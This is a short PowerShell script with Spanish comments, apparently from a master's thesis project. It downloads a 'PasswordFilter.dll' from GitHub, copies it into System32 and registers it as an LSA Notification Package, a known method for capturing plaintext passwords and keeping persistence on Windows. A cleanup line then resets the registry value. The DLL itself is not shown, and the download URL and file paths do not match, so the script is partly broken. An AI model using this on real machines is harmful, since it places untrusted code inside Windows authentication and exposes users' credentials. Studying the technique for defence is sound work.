


EJECUTAR EN POWERSHELL CON ADMIN PRIV.

Invoke-WebRequest -Uri "https://github.com/PaulaMerino/TFM/blob/main/exec/PasswordFilter.dll" -OutFile "$env:USERPROFILE\Downloads\PasswordFilter.dll"
$passwordFilterName = (Copy-Item "C:\Users\W10Home\Downloads\PasswordFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues




CLEANUP
EJECUTAR EN POWERSHELL CON ADMIN PRIV.

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /d scecli /t REG_MULTI_SZ /f



